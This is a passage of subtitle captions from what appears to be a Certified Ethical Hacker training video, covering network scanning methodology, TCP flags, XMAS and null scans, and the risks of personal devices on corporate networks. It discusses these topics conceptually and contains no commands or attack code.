and\nservices that are gonna be available.\n\n71\n00:03:17.360 --> 00:03:21.050\nRemember as an ethical hacker,\nwe're looking to identify, map out,\n\n72\n00:03:21.050 --> 00:03:25.480\nand essentially put flags in the ground\naround vulnerabilities or risks, and\n\n73\n00:03:25.480 --> 00:03:30.040\nthen identify them, come up with\na document, some sort of plan,\n\n74\n00:03:30.040 --> 00:03:33.250\na roadmap, whatever you want to\ncall it that lays out those risks,\n\n75\n00:03:33.250 --> 00:03:37.330\nthat identifies those vulnerabilities for\nour customer, whoever that is.\n\n76\n00:03:37.330 --> 00:03:40.400\nAnd then give recommendations about\nwhat we can do to deal with that.\n\n77\n00:03:40.400 --> 00:03:44.300\nHey, that service over there, we shouldn't\nrun that on that machine in the DMZ,\n\n78\n00:03:44.300 --> 00:03:46.520\nit gives away way too much information.\n\n79\n00:03:46.520 --> 00:03:50.110\nLet's put that behind the firewall\nwhere it's not going to be available.\n\n80\n00:03:50.110 --> 00:03:53.710\nThat machine running over there that\nhas all those extra services on it.\n\n81\n00:03:53.710 --> 00:03:55.760\nWhy on earth are we\nrunning those services?\n\n82\n00:03:55.760 --> 00:03:57.505\nWho needs an audio service on a server?\n\n83\n00:03:57.505 --> 00:03:59.550\n>> [LAUGH]\n>> Are we listening to Pandora\n\n84\n00:03:59.550 --> 00:04:01.390\nwhen we're in the network\noperating center?\n\n85\n00:04:01.390 --> 00:04:02.280\nIf we are, that's great.\n\n86\n00:04:02.280 --> 00:04:05.460\nBut the reality is, if you're using\nthe you should be doing a lot of things,\n\n87\n00:04:05.460 --> 00:04:07.313\nstreaming Pandora is not one of them.\n\n88\n00:04:07.313 --> 00:04:09.510\n>> [LAUGH]\n>> At least not on corporate asset.\n\n89\n00:04:09.510 --> 00:04:11.980\nYou wanna do that on your iDevice.\n\n90\n00:04:11.980 --> 00:04:15.010\nYou wanna do that on some\nsort of mobile device.\n\n91\n00:04:15.010 --> 00:04:19.580\nThat's fine, provided you do it\nwirelessly, not connected to a corporate\n\n92\n00:04:19.580 --> 00:04:24.430\nnetwork, on some sort of guest network, so\nyou're not exposing the network directly.\n\n93\n00:04:24.430 --> 00:04:27.580\nThen we can talk about that.\n\n94\n00:04:27.580 --> 00:04:31.510\nThe fact that you are not being paid\nto pay attention to Pandora but\n\n95\n00:04:31.510 --> 00:04:33.460\nrather being paid to do other\nstuff is beside the point.\n\n96\n00:04:33.460 --> 00:04:34.950\nIt's between you and your employer.\n\n97\n00:04:34.950 --> 00:04:37.620\nBut you know, when I do artwork and\nI come in and\n\n98\n00:04:37.620 --> 00:04:41.480\nwe see things going on like that and\nwe see, you know the, listen, I get it.\n\n99\n00:04:41.480 --> 00:04:42.940\nYou're there at two in\nthe morning by yourself.\n\n100\n00:04:42.940 --> 00:04:44.220\nIt's boring as all heck, right?\n\n101\n00:04:44.220 --> 00:04:46.500\nThere's nothing going on,\nyou're trying to stay awake.\n\n102\n00:04:46.500 --> 00:04:49.260\nI get the fact you wanna do stuff\njust to break up the monotony.\n\n103\n00:04:49.260 --> 00:04:51.460\nSo I totally get where you're\ncoming from with this.\n\n104\n00:04:51.460 --> 00:04:53.000\nBut again, just be smart about it, right?\n\n105\n00:04:53.000 --> 00:04:55.030\nDon't hook it up to\nthe corporate network and\n\n106\n00:04:55.030 --> 00:04:58.340\npunch a hole in the firewall with\nstuff you're not supposed to be doing.\n\n107\n00:04:58.340 --> 00:04:59.000\nBe smart.\n\n108\n00:04:59.000 --> 00:05:00.060\nYou pay for data on your phone.\n\n109\n00:05:00.060 --> 00:05:02.750\nThat's one of the things you use data for,\nright?\n\n110\n00:05:02.750 --> 00:05:05.290\n>> Mm.\n>> Or set up a separate air gapped network\n\n111\n00:05:05.290 --> 00:05:07.370\nthat is dedicated for guest access.\n\n112\n00:05:07.370 --> 00:05:09.400\nHas no access to the corporate side.\n\n113\n00:05:09.400 --> 00:05:10.410\nAnd run it off that.\n\n114\n00:05:10.410 --> 00:05:11.910\nThere are ways to do it.\n\n115\n00:05:11.910 --> 00:05:14.510\nBut when we do network scanning\nwe're looking for all this stuff.\n\n116\n00:05:14.510 --> 00:05:16.880\nWho set up rogue wireless access points?\n\n117\n00:05:16.880 --> 00:05:20.080\nWho's tethering their non corporate owned,\n\n118\n00:05:20.080 --> 00:05:23.895\nnon corporate controlled mobile\ndevice to a corporate owned asset\n\n119\n00:05:23.895 --> 00:05:27.825\nopening up a pathway into the network\naround your security devises.\n\n120\n00:05:27.825 --> 00:05:30.035\nAnd this happens all the time.\n\n121\n00:05:30.035 --> 00:05:32.855\nMany of you listening to me\nhopefully are not doing this but\n\n122\n00:05:32.855 --> 00:05:36.990\nif you walk around in your places of\nemployment and just randomly start looking\n\n123\n00:05:36.990 --> 00:05:41.770\nat what people do, you will find that\nlots of them plug in their devices, and\n\n124\n00:05:41.770 --> 00:05:46.190\neither tether, because they want to\nbe able to access information, or\n\n125\n00:05:46.190 --> 00:05:50.605\nthey wanna recharge that device so they\nplug it into the USB port to charge it up.\n\n126\n00:05:50.605 --> 00:05:56.190\nAnd/or they will plug that device in, and\nthen they will connect it to the corporate\n\n127\n00:05:56.190 --> 00:06:00.550\nwireless network, not the isolated guest\nnetwork, but the corporate network.\n\n128\n00:06:00.550 --> 00:06:04.430\nThey've essentially attached a non-manage\ncorporate device, right, non-managed,\n\n129\n00:06:04.430 --> 00:06:09.050\nnon-corporate device rather, to\na corporate network and that is bypassing\n\n130\n00:06:09.050 --> 00:06:12.380\nall the security controls,\nfirewalls and everything else, right?\n\n131\n00:06:12.380 --> 00:06:16.870\nAnd, you now have given out an IP address\nand allowed me to see that, potentially.\n\n132\n00:06:16.870 --> 00:06:18.500\nThat's really not a good idea.\n\n133\n00:06:18.500 --> 00:06:22.230\nNot to mention the fact these devices\nare basically just walking hard drives.\n\n134\n00:06:22.230 --> 00:06:23.750\nWho knows what's on them?\n\n135\n00:06:23.750 --> 00:06:25.980\nOne of the things I do\nwhen I do pen testing,\n\n136\n00:06:25.980 --> 00:06:29.130\nI load up all my hacking tools\non one of those devices.\n\n137\n00:06:29.130 --> 00:06:30.140\nI bring them in.\n\n138\n00:06:30.140 --> 00:06:33.060\nThey usually get through security\nscans with no trouble cuz\n\n139\n00:06:33.060 --> 00:06:35.170\npeople take a look at that and\ngo okay, what is that?\n\n140\n00:06:35.170 --> 00:06:36.090\nThat's whatever.\n\n141\n00:06:36.090 --> 00:06:39.070\nUnless I'm on a military base or\nI'm in a government installation\n\n142\n00:06:39.070 --> 00:06:42.080\nwhere there are specific rules\nagainst bringing in anything.\n\n143\n00:06:42.080 --> 00:06:44.530\nI mean when was the last time\nyou challenged somebody about\n\n144\n00:06:44.530 --> 00:06:46.500\nbringing a phone into a meeting?\n\n145\n00:06:46.500 --> 00:06:48.220\nI mean that's pretty standard today.\n\n146\n00:06:48.220 --> 00:06:51.500\nYet all of those phones,\nwithout exception, have on-board storage.\n\n147\n00:06:51.500 --> 00:06:52.500\nI use a Blackberry.\n\n148\n00:06:52.500 --> 00:06:56.010\nOne of the reasons I use it,\nit's not the only phone that does this,\n\n149\n00:06:56.010 --> 00:06:59.420\nbut mine has ability to be\nable to load an SD card.\n\n150\n00:06:59.420 --> 00:07:02.040\nI can carry 128 gig SD card\n\n151\n00:07:02.040 --> 00:07:06.235\non that device if I actually 256\ngig SD card if I want to and\n\n152\n00:07:06.235 --> 00:07:12.105\nI can carry 256 gigs worth of weaponized\nsoftware into your network if I want to.\n\n153\n00:07:12.105 --> 00:07:13.495\n>> Or a lot of corporate data.\n\n154\n00:07:13.495 --> 00:07:16.405\n>> Or a lot of corporate data can come out\nof the network going the other way, and\n\n155\n00:07:16.405 --> 00:07:20.965\nagain who would think twice about seeing\nthat phone sitting on a desk innocently\n\n156\n00:07:20.965 --> 00:07:24.165\nseemingly doing nothing,\neven tethered to a computer as I said.\n\n157\n00:07:24.165 --> 00:07:26.130\nIn theory nobody would\nthink twice about it.\n\n158\n00:07:26.130 --> 00:07:28.840\nYet that is one of the ways\nwe gather information,\n\n159\n00:07:28.840 --> 00:07:31.380\nwalk right out of your\nnetwork with everything.\n\n160\n00:07:31.380 --> 00:07:35.370\nI mean, it's not hard to do and\nI am not giving you secrets or\n\n161\n00:07:35.370 --> 00:07:39.630\ninformation that isn't well known among\npeople that do this for a living, right?\n\n162\n00:07:39.630 --> 00:07:42.662\nSo the reality is we're looking\nto gather corporate intelligence,\n\n163\n00:07:42.662 --> 00:07:46.213\nwe're looking to figure out how to get in\nthere, we want to discover live hosts,\n\n164\n00:07:46.213 --> 00:07:49.661\nwe want to discover systems, operating\nsystems, the architecture of them,\n\n165\n00:07:49.661 --> 00:07:53.475\nwhat's running, how are they connected,\nwhat do they do under what circumstances,\n\n166\n00:07:53.475 --> 00:07:56.922\nwhere are they, we want to figure out\nwhat's running there, what services,\n\n167\n00:07:56.922 --> 00:07:59.050\nwhat vulnerabilities,\nwant to do all of that.\n\n168\n00:07:59.050 --> 00:08:01.410\nWe want to take a look and\nreally get in, dig in deep, and\n\n169\n00:08:01.410 --> 00:08:03.077\nunderstand what's happening there.\n\n170\n00:08:03.077 --> 00:08:04.379\nWe have to understand, and\n\n171\n00:08:04.379 --> 00:08:08.058\nreally this goes back to the conversation\nbefore we came on for this episode,\n\n172\n00:08:08.058 --> 00:08:11.908\nabout hey, what's kind of a bedrock\nfoundational knowledge solution that most\n\n173\n00:08:11.908 --> 00:08:14.990\ncertified professionals look to build and\nwhat do you build on.\n\n174\n00:08:16.020 --> 00:08:19.880\nWe talked about the value of some of the\nentry level certifications from CompTIA,\n\n175\n00:08:19.880 --> 00:08:25.520\nfor instance, A+, Network +, Security +,\netc., and those kind of things.\n\n176\n00:08:26.680 --> 00:08:28.830\nSo, it's just something to consider and\n\n177\n00:08:28.830 --> 00:08:31.580\nthink about in terms of\nthe bedrock knowledge.\n\n178\n00:08:31.580 --> 00:08:35.280\nWhen you think about what you need to know\nfrom a networking perspective, right?\n\n179\n00:08:35.280 --> 00:08:38.950\nWe need to know about the TCP flags, there\nare six of them that we should be aware\n\n180\n00:08:38.950 --> 00:08:42.420\nof, and we wanna be able to think about\nand understand what those flags represent.\n\n181\n00:08:42.420 --> 00:08:46.280\nThis really goes back to in theory,\nkinda networking 101, right?\n\n182\n00:08:46.280 --> 00:08:48.110\nSo, you wanna help me\ntalk about the flags?\n\n183\n00:08:48.110 --> 00:08:50.240\nLet's see how many of them you know\nwithout actually looking them up.\n\n184\n00:08:50.240 --> 00:08:52.270\n>> Gosh, let's see.\n>> So we got six flags overall.\n\n185\n00:08:52.270 --> 00:08:52.960\n>> Six flags.\n\n186\n00:08:52.960 --> 00:08:53.845\n>> Six flags.\n\n187\n00:08:53.845 --> 00:08:54.900\n>> [LAUGH]\n>> Six.\n\n188\n00:08:54.900 --> 00:08:56.680\n>> Over Texas or is that over.\n\n189\n00:08:56.680 --> 00:08:57.750\n>> Six flags over Georgia.\n\n190\n00:08:57.750 --> 00:08:59.110\n>> Georgia, okay, yeah.\n\n191\n00:08:59.110 --> 00:09:00.530\nYou got the, fin.\n\n192\n00:09:00.530 --> 00:09:01.620\nYou got the ack.\n\n193\n00:09:01.620 --> 00:09:03.100\n>> All right, so you got the fin.\n\n194\n00:09:03.100 --> 00:09:03.810\nYou got the ack.\n\n195\n00:09:03.810 --> 00:09:04.581\n[CROSSTALK]\n>> You got the sin.\n\n196\n00:09:04.581 --> 00:09:05.144\n>> You got the sin.\n\n197\n00:09:05.144 --> 00:09:05.976\n>> You got the reset.\n\n198\n00:09:05.976 --> 00:09:07.023\n>> Got the RST for reset.\n\n199\n00:09:07.023 --> 00:09:07.679\n>> You got the urge.\n\n200\n00:09:07.679 --> 00:09:08.490\n>> Got the urge.\n\n201\n00:09:08.490 --> 00:09:09.420\n>> And the push.\n\n202\n00:09:09.420 --> 00:09:10.180\n>> And the push.\n\n203\n00:09:10.180 --> 00:09:10.750\nAbsolute, right.\n\n204\n00:09:10.750 --> 00:09:12.010\nSay you've got-\n>> Six, did I get all six?\n\n205\n00:09:12.010 --> 00:09:12.870\n>> Total of six, right?\n\n206\n00:09:12.870 --> 00:09:14.205\n>> Good-\n>> Absolutely, you got six.\n\n207\n00:09:14.205 --> 00:09:16.370\n>> [LAUGH]\n>> So, we wanna think about, right?\n\n208\n00:09:16.370 --> 00:09:16.970\nAnd yeah, exactly,\n\n209\n00:09:16.970 --> 00:09:18.430\nthey're really in no particular order-\n>> Right.\n\n210\n00:09:18.430 --> 00:09:19.740\n>> Just a matter of getting them.\n\n211\n00:09:19.740 --> 00:09:21.300\nSo, but let's talk about each one.\n\n212\n00:09:21.300 --> 00:09:24.470\nSo Mike got all six, so Mike gets to\ntake the rest of the day off, right?\n\n213\n00:09:24.470 --> 00:09:25.810\nWe're gonna bring somebody else in who's\n\n214\n00:09:25.810 --> 00:09:26.426\ngonna-\n>> [LAUGH]\n\n215\n00:09:26.426 --> 00:09:27.664\n>> Sit here and play with me, right?\n\n216\n00:09:27.664 --> 00:09:29.107\n>> Woo-hoo.\n>> So the TCP communication flags\n\n217\n00:09:29.107 --> 00:09:30.301\nare really important, right?\n\n218\n00:09:30.301 --> 00:09:33.899\nThis is one of those elements acknowledge\nthat as a certified ethical hacker, if you\n\n219\n00:09:33.899 --> 00:09:37.610\ndon't have, look we all know, you go look\nit up, it's not the end of the world.\n\n220\n00:09:37.610 --> 00:09:39.520\nNobody says you gotta walk\naround with it in your head.\n\n221\n00:09:39.520 --> 00:09:42.670\nBut in terms of preparing for the exam,\nyou do need to know what they are and\n\n222\n00:09:42.670 --> 00:09:43.310\nhave them in your head.\n\n223\n00:09:43.310 --> 00:09:46.620\nBut overall, it's one of those things that\nwe often forget about until we have to do\n\n224\n00:09:46.620 --> 00:09:50.630\na scan and then we look at that stuff and\nsay, hey, what the heck is that?\n\n225\n00:09:50.630 --> 00:09:51.920\nWhat's a SYN scan?\n\n226\n00:09:51.920 --> 00:09:53.070\nWhat's an XMAS scan?\n\n227\n00:09:53.070 --> 00:09:54.170\nAll right, what's a null scan?\n\n228\n00:09:54.170 --> 00:09:56.490\nAnd I gotta go back and\nread up on that stuff.\n\n229\n00:09:56.490 --> 00:10:01.250\nThese flags allow us to understand\nthe settings that are being used in\n\n230\n00:10:01.250 --> 00:10:04.370\nthe TCP packet, and\nhow we're looking to communicate.\n\n231\n00:10:04.370 --> 00:10:07.550\nAn urge flag, or urgent flag,\nmarks the packet as urgent and\n\n232\n00:10:07.550 --> 00:10:11.000\ngives it a priority rating,\nfor instance, of some kind.\n\n233\n00:10:11.000 --> 00:10:16.180\nThe fin, or finish packet,\nessentially says to the receiver,\n\n234\n00:10:16.180 --> 00:10:18.980\nhey, you know, we're done communicating.\n\n235\n00:10:18.980 --> 00:10:21.740\nAck and Syn are part of\nthe TCP three-way-handshake.\n\n236\n00:10:21.740 --> 00:10:23.230\nSyn, Ack, Ack.\n\n237\n00:10:23.230 --> 00:10:28.530\nSo we wanna make sure that we\nare thinking about what these flags do.\n\n238\n00:10:28.530 --> 00:10:30.240\nReset resets a connection, right.\n\n239\n00:10:30.240 --> 00:10:32.280\nFin finalizes, no more.\n\n240\n00:10:32.280 --> 00:10:35.930\nUrge gives us the ideas, as I've said,\nof a priority rating for\n\n241\n00:10:35.930 --> 00:10:39.210\nthat packet process immediately\nis what the urge flag means.\n\n242\n00:10:39.210 --> 00:10:43.030\nPush sends all buffered data immediately,\nthe PSH or push flag.\n\n243\n00:10:43.030 --> 00:10:45.960\nWe talked about ACK and SYN,\nacknowledge and synchronize.\n\n244\n00:10:45.960 --> 00:10:47.650\nThese six flags are vital for\n\n245\n00:10:47.650 --> 00:10:51.285\nus to understand because all the crafting\nwe're gonna do, all the manipulation of\n\n246\n00:10:51.285 --> 00:10:55.390\npackets we may engage in, all of the data\ngathering we're gonna do with tools like\n\n247\n00:10:55.390 --> 00:11:00.310\nWireshark that we're produce and gonna\ngo through with ENDMAP all that stuff\n\n248\n00:11:00.310 --> 00:11:03.350\nis gonna be based on knowledge of\nthese flags and how they operate.\n\n249\n00:11:03.350 --> 00:11:07.641\nAnd when you think about it what we're\nlooking at graphically if we think about\n\n250\n00:11:07.641 --> 00:11:11.476\nit is simply just a matter of having\nthe insight into the TCP header, or\n\n251\n00:11:11.476 --> 00:11:13.900\nthe packet header, generically, right.\n\n252\n00:11:13.900 --> 00:11:18.095\nInside the header, if we think of header\nas essentially, maybe a cylindrical,\n\n253\n00:11:18.095 --> 00:11:19.340\nis there stuff in here?\n\n254\n00:11:19.340 --> 00:11:20.039\n>> Yeah, probably.\n\n255\n00:11:20.039 --> 00:11:20.977\n>> I don't wanna hold this thing up and\nturn it sideways.\n\n256\n00:11:20.977 --> 00:11:21.803\n>> No, don't turn it sideways.\n\n257\n00:11:21.803 --> 00:11:22.767\n[LAUGH]\n>> Probably not a good idea.\n\n258\n00:11:22.767 --> 00:11:24.293\nSo if we think about, as I hold it up and\nthe coffee pours everywhere.\n\n259\n00:11:24.293 --> 00:11:28.686\nIf we think about really just maybe\nlike a little cylindrical object,\n\n260\n00:11:28.686 --> 00:11:30.740\nsomething like this right?\n\n261\n00:11:30.740 --> 00:11:35.130\nAnd if the cylinder is essentially\nthen subdivided into little chambers,\n\n262\n00:11:35.130 --> 00:11:38.850\nlittle areas, squares or boxes that\nhave functionality ascribed to them.\n\n263\n00:11:38.850 --> 00:11:42.065\nIt's what the header looks like when\nwe diagram it out traditionally, right?\n\n264\n00:11:42.065 --> 00:11:43.900\n>> Mm-hm.\n>> And in there,\n\n265\n00:11:43.900 --> 00:11:47.735\namong the many things we see, we'll see\na to and a from area that will have IP\n\n266\n00:11:47.735 --> 00:11:52.440\nand/or Mac addresses associated with\nit to identify sender and recipient.\n\n267\n00:11:52.440 --> 00:11:57.600\nWe will see additional areas, and\ntherefore a variety of functionality.\n\n268\n00:11:57.600 --> 00:12:02.050\nThere may be things that are associated\nwith a VLAN ID, for instance, would be\n\n269\n00:12:02.050 --> 00:12:05.120\nthere, perhaps a private secondary VLAN,\nif we're nesting, would be in there.\n\n270\n00:12:05.120 --> 00:12:08.320\nSo there would be different things that\nwould be in the header, but in addition to\n\n271\n00:12:08.320 --> 00:12:12.630\nall that we would see the TCP flags, and\nwe would see information about the flags,\n\n272\n00:12:12.630 --> 00:12:16.250\nand we would see whether they're turned\non or off, and what their status is.\n\n273\n00:12:16.250 --> 00:12:19.540\nYou'll on, or off, zero or one,\nessentially a binary choice.\n\n274\n00:12:19.540 --> 00:12:22.340\nWhen we enable certain flags we\nenable certain functionality.\n\n275\n00:12:22.340 --> 00:12:25.000\nWhen we turn off flags,\nwe turn off that functionality.\n\n276\n00:12:25.000 --> 00:12:29.077\nWe can manipulate that, understand and\nuse that to our advantage as an ethical\n\n277\n00:12:29.077 --> 00:12:33.402\nhacker, because we can then craft scans\nthat will look for certain responses based\n\n278\n00:12:33.402 --> 00:12:37.760\non whether those flags are enabled or not,\nand if they are what can we tell about it?\n\n279\n00:12:37.760 --> 00:12:41.580\nAn XMAS scan, for instance, with Nmap,\nis a scan that enables all the flags.\n\n280\n00:12:41.580 --> 00:12:45.410\nIt essentially sets them all up, turns\nthem all on, and then what do we see?\n\n281\n00:12:45.410 --> 00:12:49.920\nA null scan turns them all off and then\nwhat do we see as a result of that, right.\n\n282\n00:12:49.920 --> 00:12:53.540\nAnd so\nwe wanna understand how these flags work.\n\n283\n00:12:53.540 --> 00:12:56.890\nWhat the value of that understanding\nis ultimately becomes the ability to\n\n284\n00:12:56.890 --> 00:12:58.790\nmanipulate packets and read and\n\n285\n00:12:58.790 --> 00:13:01.730\nunderstand data as we think about\nhow we're going to scan it.\n\n286\n00:13:01.730 --> 00:13:04.340\nWe're going to take a look at some\nof this as we go in and do some,\n\n287\n00:13:04.340 --> 00:13:05.440\na little show and tell.\n\n288\n00:13:05.440 --> 00:13:06.770\nWe'll take a look at\nthis just a little bit.\n\n289\n00:13:06.770 --> 00:13:10.730\nBut we also can use software that will\nactually let us craft these packets.\n\n290\n00:13:10.730 --> 00:13:14.750\nIt's not enough just to say, let's just\nsend out a ping and see what comes back.\n\n291\n00:13:14.750 --> 00:13:18.710\nLet's send out a scan with certain\nkinds of flags and see what comes back.\n\n292\n00:13:18.710 --> 00:13:23.060\nWe can make our own network packets and\nessentially transmit our own data, for\n\n293\n00:13:23.060 --> 00:13:24.200\ngood or bad.\n\n294\n00:13:24.200 --> 00:13:28.760\nAnd there are programs out there that let\nus build entire network communication\n\n295\n00:13:28.760 --> 00:13:34.370\nchains of packets that are crafted\nspecifically to push attack packets or\n\n296\n00:13:34.370 --> 00:13:38.460\nto fragment attacks so that we can slip\nfive or six packets in, wait a bit,\n\n297\n00:13:38.460 --> 00:13:40.060\nslip another five or six in.\n\n298\n00:13:40.060 --> 00:13:42.700\nWe tend to call these low-and-slow\nattacks, generically.\n\n299\n00:13:42.700 --> 00:13:46.170\nWhich is code for\nfragmentation attacks more often than not.\n\n300\n00:13:46.170 --> 00:13:51.010\nThere are programs that will allow us\nto build an entire attack package.\n\n301\n00:13:51.010 --> 00:13:54.410\nThings like the metasploit framework,\nwhich we'll look at in upcoming episodes.\n\n302\n00:13:54.410 --> 00:13:58.415\nTo build exploit packages that can\nthen be used to craft attacks and\n\n303\n00:13:58.415 --> 00:13:59.823\nlaunch them against systems.\n\n304\n00:13:59.823 --> 00:14:03.340\nThere's a variety of ways,\nas both hackers and ethical hackers,\n\n305\n00:14:03.340 --> 00:14:08.200\nwe can take knowledge of networking and\nstructure of network stacks and manipulate\n\n306\n00:14:08.200 --> 00:14:11.690\nnot only the information but manipulate\nthat knowledge to our advantage.\n\n307\n00:14:12.755 --> 00:14:15.375\nAny of you that really wanna\nget good at this, that really,\n\n308\n00:14:15.375 --> 00:14:19.975\nout beyond just getting through the\nmaterial, out beyond basic understanding.\n\n309\n00:14:19.975 --> 00:14:23.185\nReally wanna practice this craft and\nbecome good at it.\n\n310\n00:14:23.185 --> 00:14:27.150\nYou need to go back and read the RFC's\nthat were the foundational elements,\n\n311\n00:14:27.150 --> 00:14:29.450\nthe building blocks of these protocols.\n\n312\n00:14:29.450 --> 00:14:32.580\nSo for instance, the RFC for TCP, right?\n\n313\n00:14:32.580 --> 00:14:35.010\nGoing back and\nlooking at that, reading that.\n\n314\n00:14:35.010 --> 00:14:36.790\nAnd it's not the most exciting document.\n\n315\n00:14:36.790 --> 00:14:37.800\nIt's very technical.\n\n316\n00:14:37.800 --> 00:14:42.040\nThere's a lot of stuff in their that 30\nsome odd years later still doesn't make\n\n317\n00:14:42.040 --> 00:14:45.620\nthat much sense to most human\nbeings because we just don't do\n\n318\n00:14:45.620 --> 00:14:47.590\na lot of the stuff on a regular basis.\n\n319\n00:14:47.590 --> 00:14:51.990\nBut, the reality is, all the information\nthat you need to understand how to hack\n\n320\n00:14:51.990 --> 00:14:56.340\ninto any system on the planet and all of\nthe exploits that people are coming up\n\n321\n00:14:56.340 --> 00:15:00.460\nwith and using, all the software we talked\nabout here, all the things we are showing\n\n322\n00:15:00.460 --> 00:15:02.830\nyou, and all the things we don't\nshow you cuz we don't have time to,\n\n323\n00:15:02.830 --> 00:15:06.620\nbut the million other things that go\ninto this are all in those documents.\n\n324\n00:15:06.620 --> 00:15:11.010\nYou just have to understand what's there,\nand then think the way the hacker does to\n\n325\n00:15:11.010 --> 00:15:14.040\nessentially extract that knowledge and\nmanipulate that information.\n\n326\n00:15:14.040 --> 00:15:17.895\nBut every hack that's ever been\ncreated around networking, originally,\n\n327\n00:15:17.895 --> 00:15:21.460\nis gonna be found, the knowledge about it\nand the understanding of the system and\n\n328\n00:15:21.460 --> 00:15:25.400\nthe weaknesses and the exploits are not\nlaid out in black and white there.\n\n329\n00:15:25.400 --> 00:15:30.060\nBut the information about the potential\nfor them is there, in those documents.\n\n330\n00:15:30.060 --> 00:15:32.410\nAnd if you back and\nlook you will find it there.\n\n331\n00:15:32.410 --> 00:15:36.260\nIt's amazing what is sitting in\nthat treasure trove of information,\n\n332\n00:15:36.260 --> 00:15:38.930\nthat is sitting out there just waiting for\nus to go back and take a look.\n\n333\n00:15:38.930 --> 00:15:41.250\nAnd everything old becomes new again,\nwe often say.\n\n334\n00:15:41.250 --> 00:15:42.016\n>> Yes.\n[LAUGH]\n\n335\n00:15:42.016 --> 00:15:42.584\n>> Right?\n\n336\n00:15:42.584 --> 00:15:44.487\nAnd if you take the time to go back and\n\n337\n00:15:44.487 --> 00:15:48.370\nlook at the historical footprints\nthat are in the sands of time.\n\n338\n00:15:48.370 --> 00:15:49.410\nI'm waxing poetic here.\n\n339\n00:15:49.410 --> 00:15:49.920\n>> Right.\n\n340\n00:15:49.920 --> 00:15:52.910\n>> That are in the sands of time\nwith regards to this kinda stuff.\n\n341\n00:15:52.910 --> 00:15:56.460\nYou will be amazed, absolutely amazed at\nthe amount of information that's just\n\n342\n00:15:56.460 --> 00:15:59.190\nsitting there in plain sight,\nwaiting for people to figure it out.\n\n343\n00:15:59.190 --> 00:16:01.230\nAnd this is where a lot of\nthis stuff is coming from.\n\n344\n00:16:01.230 --> 00:16:02.370\nThere's no doubt about it.\n\n345\n00:16:02.370 --> 00:16:05.088\nSo we're gonna go out, we're gonna\nthink about checking for live systems.\n\n346\n00:16:05.088 --> 00:16:07.330\nThis is part of the methodology\nwe're gonna use.\n\n347\n00:16:07.330 --> 00:16:08.468\nWe're to look for open ports.\n\n348\n00:16:08.468 --> 00:16:10.377\nWe're gonna talk about and\nsee how to do that.\n\n349\n00:16:10.377 --> 00:16:14.014\nWell, take a look at how to get in\nbehind things like firewalls and IDS's,\n\n350\n00:16:14.014 --> 00:16:17.410\ntalk about scanning,\nwhat we could do to see information there.\n\n351\n00:16:17.410 --> 00:16:21.270\nWe may look at things like banner grabbing\nwhen we're talking about doing scanning.\n\n352\n00:16:21.270 --> 00:16:24.810\nCan we grab information as I mentioned\nin one of the prior episodes\n\n353\n00:16:24.810 --> 00:16:26.300\nfrom something like a web server.\n\n354\n00:16:26.300 --> 00:16:30.820\nAnd if we can get that host header back\nfrom the system it says, IS version 8.5,\n\n355\n00:16:30.820 --> 00:16:35.570\nwhat does that tell us or\nApache Linux version 2.6 or whatever.\n\n356\n00:16:35.570 --> 00:16:36.940\nThat's gonna tell us something.\n\n357\n00:16:36.940 --> 00:16:40.220\nIf we're not scrubbing those host setters,\nwe're gonna be able to get information.\n\n358\n00:16:40.220 --> 00:16:41.500\nLooking for vulnerabilities,\n\n359\n00:16:41.500 --> 00:16:45.850\nusing vulnerability scanning tools like\nNessus for instance or things like that.\n\n360\n00:16:45.850 --> 00:16:48.220\nBeing able to figure out and\ndraw network diagrams, so\n\n361\n00:16:48.220 --> 00:16:52.040\nwe may use tools that will\nlet us map out what we find.\n\n362\n00:16:52.040 --> 00:16:55.740\nPreparing and dealing with the use of\nproxies and proxy chaining to hide and\n\n363\n00:16:55.740 --> 00:16:57.830\nobfuscate our activities.\n\n364\n00:16:57.830 --> 00:17:01.480\nWe'll talk about these things and\nof course rolling this all up and\n\n365\n00:17:01.480 --> 00:17:04.070\nengaging in pen testing as\na result of this, right?\n\n366\n00:17:04.070 --> 00:17:05.580\nWhen we think about scanning for\n\n367\n00:17:05.580 --> 00:17:09.400\nlive systems, we wanna think about things\nlike something as simple as pinging.\n\n368\n00:17:09.400 --> 00:17:12.660\nI see MP scanning, going out to ping and\nsee who's on the other end right.\n\n369\n00:17:12.660 --> 00:17:15.280\nKnock on the door and say,\nhey is anybody there, right,\n\n370\n00:17:15.280 --> 00:17:18.210\nthose are the kinds of things\nthat we want to think about.\n\n371\n00:17:18.210 --> 00:17:20.355\nI lean on a regular basis by the way.\n\n372\n00:17:20.355 --> 00:17:22.610\n>> [LAUGH].\nIt has nothing to do with anything other\n\n373\n00:17:22.610 --> 00:17:25.360\nthan the fact that I'm used to\nteaching and walking around.\n\n374\n00:17:25.360 --> 00:17:28.450\nThis is how I teach, as people\nthat work with me here [LAUGH] and\n\n375\n00:17:28.450 --> 00:17:30.720\nanywhere in the world that\nI've ever spent time know.\n\n376\n00:17:30.720 --> 00:17:32.530\nAnd because I'm tethered\nto the floor here,\n\n377\n00:17:32.530 --> 00:17:37.550\nliterally by about a three-foot mycord,\nthat I can't walk around.\n\n378\n00:17:37.550 --> 00:17:41.030\nAnd so fighting that urge,\nthe only other thing I can do is lean,\n\n379\n00:17:41.030 --> 00:17:43.370\nbecause if I don't lean,\nI'm gonna start wandering.\n\n380\n00:17:43.370 --> 00:17:44.650\nSo that's why you see me leaning.\n\n381\n00:17:44.650 --> 00:17:48.630\nOccasionally, I go out of sync on the\nframe and I'm on one side or the other.\n\n382\n00:17:48.630 --> 00:17:50.110\nBut that's on purpose boys and girls.\n\n383\n00:17:50.110 --> 00:17:51.674\nIf I don't do that you're\nnot gonna be able to see me.\n\n384\n00:17:51.674 --> 00:17:53.060\n>> [LAUGH]\n>> You're gonna hear me talking and\n\n385\n00:17:53.060 --> 00:17:54.440\nI'm gonna be around the room.\n\n386\n00:17:54.440 --> 00:17:55.830\nSo that's why I do that.\n\n387\n00:17:55.830 --> 00:17:59.700\nBut when we think about ICMP scanning and\nthat's something as simple as just\n\n388\n00:17:59.700 --> 00:18:02.670\npinging, can you bring up,\njust before we go to Mike's machine.\n\n389\n00:18:02.670 --> 00:18:05.060\n>> Just let him get ready for\nthis one because we didn't plan on this.\n\n390\n00:18:05.060 --> 00:18:07.340\nCan you just go ahead and\nquickly spring up our command window?\n\n391\n00:18:07.340 --> 00:18:10.663\nLet's just do a quick generic ping and\njust take a look at what that will be.\n\n392\n00:18:10.663 --> 00:18:11.871\nJust tell me when you're ready.\n\n393\n00:18:11.871 --> 00:18:13.135\nSo we'll go to Mike's machine for\na 